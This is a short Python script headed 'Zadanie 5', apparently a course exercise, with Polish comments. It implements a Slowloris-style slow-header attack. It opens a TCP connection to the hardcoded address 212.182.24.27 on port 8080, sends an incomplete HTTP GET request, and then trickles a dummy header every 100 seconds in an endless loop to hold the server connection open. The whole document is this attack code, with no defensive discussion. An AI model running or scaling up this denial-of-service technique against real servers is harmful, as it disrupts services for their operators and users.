"""
Zadanie 5
"""

import socket
import time

target_host = "212.182.24.27"
target_port = 8080

def main():
    # Tworzenie gniazda TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Podłączanie do serwera
    sock.connect((target_host, target_port))

    # Wysyłanie podstawowych nagłówków
    headers = "GET / HTTP/1.1\r\nHost: " + target_host + "\r\n\r\n"
    sock.send(headers.encode())

    # Wysyłanie powolnych nagłówków
    while True:
        slow_header = "X-a: b\r\n"
        sock.send(slow_header.encode())
        time.sleep(100)

if __name__ == "__main__":
    main()
    